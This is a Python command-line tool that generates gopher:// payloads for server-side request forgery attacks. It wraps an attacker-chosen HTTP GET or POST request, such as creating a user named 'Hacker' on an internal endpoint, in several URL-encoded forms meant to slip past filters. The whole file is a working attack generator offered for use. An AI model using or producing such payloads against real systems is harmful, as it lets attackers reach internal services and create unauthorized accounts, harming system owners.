import argparse
import urllib.parse

def generate_payloads(host, port, endpoint, data, request_type):
    if request_type.upper() == 'GET':
        payload = f"GET {endpoint}?{data} HTTP/1.1\nHost: {host}\n\n"
    elif request_type.upper() == 'POST':
        payload = f"POST {endpoint} HTTP/1.1\nHost: {host}\nContent-Type: application/x-www-form-urlencoded\nContent-Length: {len(data)}\n\n{data}"
    else:
        raise ValueError("Invalid request type. Only 'GET' and 'POST' are supported.")
    
    plain_text_payload = f"gopher://{host}:{port}/_{payload}"
    url_encoded_payload = f"gopher://{host}:{port}/_{urllib.parse.quote(payload)}"
    double_url_encoded_payload = f"gopher://{host}:{port}/_{urllib.parse.quote(urllib.parse.quote(payload))}"
    fully_url_encoded_payload = urllib.parse.quote(double_url_encoded_payload)
    
    return plain_text_payload, url_encoded_payload, double_url_encoded_payload, fully_url_encoded_payload

def main():
    parser = argparse.ArgumentParser(description="Generate gopher payloads for SSRF attacks.")
    parser.add_argument('--host', required=True, help="Target host, e.g., localhost")
    parser.add_argument('--port', required=True, type=int, help="Port number on target host, e.g., 80")
    parser.add_argument('--endpoint', required=True, help="Endpoint path, e.g., /api/user/create/")
    parser.add_argument('--data', required=True, help="Data to be submitted, e.g., username=Hacker&password=Password1234&email=email@domain.tld")
    parser.add_argument('--request-type', required=True, choices=['GET', 'POST'], help="HTTP request type, either GET or POST")

    args = parser.parse_args()

    try:
        plain_text_payload, url_encoded_payload, double_url_encoded_payload, fully_url_encoded_payload = generate_payloads(args.host, args.port, args.endpoint, args.data, args.request_type)
        print(f"\033[92m🚀 Plain Text Payload:\033[0m\n{plain_text_payload}\n")
        print(f"\033[93m🔗 URL Encoded Payload:\033[0m\n{url_encoded_payload}\n")
        print(f"\033[91m🔐 Double URL Encoded Payload:\033[0m\n{double_url_encoded_payload}\n")
        print(f"\033[94m🌐 Fully URL Encoded Payload:\033[0m\n{fully_url_encoded_payload}\n")
    except ValueError as e:
        print(e)

if __name__ == "__main__":
    main()